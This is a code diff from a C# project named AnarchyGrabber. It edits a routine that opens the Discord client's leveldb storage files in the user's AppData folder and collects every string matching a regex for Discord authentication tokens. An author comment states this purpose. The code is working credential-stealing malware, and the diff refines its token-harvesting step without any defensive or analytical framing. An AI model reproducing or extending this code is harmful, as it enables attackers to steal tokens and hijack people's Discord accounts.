@@ -14,20 +14,19 @@ namespace AnarchyGrabber
 
             try
             {
-                DirectoryInfo leveldb = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\" + dir);
-
-                tokens = new List<string>();
+                DirectoryInfo leveldb = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) 
+                                                          + @"\AppData\" 
+                                                          + dir 
+                                                          + @"\Local Storage\leveldb");
 
                 foreach (var file in leveldb.GetFiles(checkLogs ? "*.log" : "*.ldb"))
                 {
                     //looks for discord token patterns (yes my regex is shit shut up)
                     foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), @"[\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-]\.[\w-][\w-][\w-][\w-][\w-][\w-]\.[\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-]"))
-                    {
-                        if (match.Success)
                             tokens.Add(match.Value);
-                    }
                 }
-            } catch { }
+            }
+            catch { }
 
             tokens = tokens.Distinct().ToList();
 
